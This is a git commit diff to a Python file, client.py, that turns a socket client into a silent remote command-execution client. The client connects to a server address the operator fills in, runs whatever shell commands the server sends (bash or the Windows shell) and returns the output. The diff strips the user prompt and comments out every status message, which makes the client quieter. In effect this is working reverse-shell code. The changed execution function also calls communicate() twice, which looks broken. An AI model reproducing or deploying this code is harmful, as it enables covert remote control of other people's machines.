a1e4ec49dbef9b5feef807e4af2b12c20e49abf3
bucksnort2 <stevenisawesome42@gmail.com>
2023-07-21 17:13:26 -0600

    Update client.py
    Working client. Accepts commands and sends the result to the server. Need to test on a variety of machines.

--- client.py
+++ client.py
@@ -1,17 +1,16 @@
 import socket
 import threading
 import platform
+import subprocess
 import os
 
 def execute_command(command):
     if platform.system().lower() == "windows":
-        import subprocess
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
-        return result.stdout + result.stderr
+        result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        return result.communicate()[0] + result.communicate()[1]
     else:
-        import subprocess
-        result = subprocess.run(command, shell=True, capture_output=True, text=True, executable="/bin/bash")
-        return result.stdout + result.stderr
+        result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, executable="/bin/bash")
+        return result.communicate()[0] + result.communicate()[1]
 
 def main():
     host = "127.0.0.1"  # Change this to your server's IP address
@@ -21,35 +20,34 @@ def main():
     client_socket.connect((host, port))
 
     response = client_socket.recv(1024)
-    print(response.decode())
+    #print(response.decode())
 
     receive_thread = threading.Thread(target=receive_messages, args=(client_socket,))
     receive_thread.start()
-
-    while True:
-        command = input("Enter a command (or 'exit' to quit): ")
-        if command.lower() == "exit":
-            client_socket.close()
-            break
-
-        client_socket.send(command.encode())  # Send the command to the server
 
 def receive_messages(client_socket):
     while True:
         try:
             data = client_socket.recv(4096)
             if not data:
-                print("Server closed the connection.")
+                #print("Server closed the connection.")
                 break
 
             command = data.decode()  # Received command from the server
             result = execute_command(command)  # Execute the command
             client_socket.send(result.encode())  # Send the output back to the server
 
-        except:
-            print("Error while receiving data from the server.")
+        except ConnectionError:
+            #print("Error: Connection to the server lost.")
+            break
+
+        except subprocess.CalledProcessError as e:
+            #print(f"Error executing command: {e}")
+            break
+
+        except Exception as e:
+            #print(f"An unexpected error occurred: {e}")
             break
 
 if __name__ == "__main__":
     main()
-
